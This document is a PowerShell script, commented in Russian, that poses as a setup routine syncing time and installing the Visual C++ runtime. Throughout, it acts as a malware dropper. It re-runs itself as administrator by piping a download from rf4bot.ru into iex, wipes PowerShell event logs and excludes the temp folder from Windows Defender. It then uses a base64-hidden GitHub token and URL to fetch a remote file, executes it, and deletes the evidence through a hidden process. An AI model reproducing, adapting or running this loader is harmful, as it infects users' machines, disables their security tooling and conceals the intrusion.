function Ensure-RunAsAdmin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        $scriptPath = $MyInvocation.MyCommand.Definition
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex( iwr rf4bot.ru/nemo)`""

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = $arguments
        $psi.Verb = "runas"

        try {
            [Diagnostics.Process]::Start($psi) | Out-Null
            Exit
        } catch {
            Write-Error "Error: Failed to start with administrator privileges."
            Exit 1
        }
    }
}

# Создаем глобальную переменную для отслеживания ошибок
$global:hadErrors = $false

# Переопределяем функцию Write-Error для установки флага ошибки
function Global:Write-Error {
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Message
    )
    $global:hadErrors = $true
    Microsoft.PowerShell.Utility\Write-Error $Message
}

Function Sync-LocalTime {
    param(
        [Parameter(Mandatory=$false)]
        [string]$NtpServer = "time.windows.com"
    )

    try {
        w32tm /config /manualpeerlist:"$NtpServer" /syncfromflags:MANUAL /update
    }
    catch {
        Write-Error "Error: Failed to configure time service. $($_.Exception.Message)"
    }

    try {
        Stop-Service w32time -ErrorAction Stop
        Start-Service w32time -ErrorAction Stop
    }
    catch {
        Write-Error "Error: Failed to restart time service. $($_.Exception.Message)"
    }

    try {
        w32tm /resync /force
    }
    catch {
        Write-Error "Error: Failed to force time resync. $($_.Exception.Message)"
    }
}

cls
Ensure-RunAsAdmin
Sync-LocalTime -NtpServer "time.windows.com"
cls
function Set-RegistryValue {
    param (
        [string]$Path = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\Main",
        [string]$Name = "DisableFirstRunCustomize",
        [int]$Value = 2
    )

    try {
        Set-ItemProperty -Path $Path -Name $Name -Value $Value
    } catch {
        Write-Error "Error: Failed to set registry value. $($_.Exception.Message)"
    }
}

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Error "Error: Failed to clear event logs. $($_.Exception.Message)"
}

$temp = $env:TEMP

$systemPath = "$env:SystemRoot\System32";
$file1 = "$systemPath\msvcp140.dll";
$file2 = "$systemPath\vcruntime140_1.dll";
$file3 = "$systemPath\vcruntime140.dll";
$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);

try	{
	if (!$redistCheck)
	{
		$redistFilePath = "$temp\VC_redist.x64.exe"
		try
		{
			Remove-Item $redistFilePath -ErrorAction Ignore;
		}
		catch {
            Write-Error "Error: Failed to remove existing redistributable file. $($_.Exception.Message)"
        }
		try
		{
			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to download VC++ redistributable. $($_.Exception.Message)"
		}
		try
		{
			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
			Remove-Item $redistFilePath -ErrorAction Ignore;
		} catch {
            Write-Error "Error: Failed to install VC++ redistributable. $($_.Exception.Message)"
		}
	}

    
	try { 
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            try {
                $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
                if ($defenderService -and $defenderService.Status -eq "Running") {
                    $preferences = Get-MpPreference -ErrorAction SilentlyContinue
                    if ($preferences) {
                        if ($preferences.DisableRealtimeMonitoring -eq $true) {
                            Write-Host "Windows Defender real-time protection is disabled" -ForegroundColor Yellow
                        }
                        try {
                            Add-MpPreference -ExclusionPath $temp -ErrorAction Stop
                            Write-Host "Successfully added exclusion to Windows Defender: $temp" -ForegroundColor Green
                        } catch {
                            if ($_.Exception.Message -like "*0x800106ba*" -or $_.Exception.Message -like "*tamper*" -or $_.Exception.Message -like "*policy*") {
                                Write-Host "Tamper Protection or Group Policy is blocking Windows Defender changes" -ForegroundColor Red
                            } else {
                                Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
                            }
                        }
                    } else {
                        Write-Host "Cannot get Windows Defender preferences - service may be disabled" -ForegroundColor Yellow
                    }
                } else {
                    Write-Host "Windows Defender service is not running" -ForegroundColor Yellow
                }
            } catch {
                Write-Error "Error: Failed to check Windows Defender status. $($_.Exception.Message)"
            }
        } else {
            Write-Host "Windows Defender module not available - skipping exclusion" -ForegroundColor Yellow
        }
    } catch {
        Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
    }
    $FilePaths = @("$env:SystemRoot\Temp", "$env:USERPROFILE\AppData\Local\Temp", "$env:TEMP", "$env:TMP")
    foreach ($FolderPath in $FilePaths) { 
        try {
            if (Test-Path $FolderPath) {
                Start-Process cmd.exe -ArgumentList "/c", "del", "/f", "/q", "`"$FolderPath\tmp*.tmp`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            }
        } catch {}
    }
    $contFile = [System.IO.Path]::GetTempFileName()
    try {		
		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGVlSUViUWhPTkZsUF81aWFPeXBLV3ZCR3BLU3NPa1FPSnRLU3RBYng5bmJHVkdtQW5FY2xBNmJHT0gyMkZZRElHTDlqdnVHRw=="
		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
        $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9fL2NvbnRlbnRzL19f"
        $Url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
		$q = '"'
		$h = @{
			"Authorization"  = "$String"
			"Cache-Control"  = "no-cache"
		}
        $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
		Invoke-WebRequest $response.download_url -OutFile $contFile 
		

        if (Test-Path $contFile) {
			try {
               
				$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -PassThru
				
				$cleanupScript = @"
				# Ждем завершения процесса по PID
				while (Get-Process -Id $($process.Id) -ErrorAction SilentlyContinue) {
					Start-Sleep -Seconds 1
				}
				
				# Дополнительная пауза для завершения всех дочерних процессов
				Start-Sleep -Seconds 2
				
				# Удаляем файл
				for (`$i = 1; `$i -le 5; `$i++) {
					try {
						Remove-Item '$contFile' -Force -ErrorAction Stop
						break
					} catch {
						if (`$i -lt 5) {
							Start-Sleep -Seconds 1
						}
					}
				}
"@
				
				Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle", "Hidden", "-Command", $cleanupScript -WindowStyle Hidden
				
				Exit 0
			} catch {
				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
				# Попытка удалить файл при ошибке
				try {
					Remove-Item $contFile -Force -ErrorAction SilentlyContinue
				} catch {}
				Start-Sleep -s 3
			}
        } else {
            Write-Error "Error: Downloaded file does not exist at expected location."
            Start-Sleep -s 3
        }
    } catch {
        Write-Error "Error: Failed to download or process the file. $($_.Exception.Message)"
        Start-Sleep -s 3
    }


} finally {
	Set-RegistryValue
}

# Проверяем, были ли ошибки, и если да, то закрываем консоль через 5 секунд
if ($global:hadErrors) {
    Write-Host "`nErrors were encountered during script execution." -ForegroundColor Red
    Write-Host "Console will automatically close in 5 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    Exit 1
}
# Убираем команду exit для удержания консоли открытой при ручном запуске
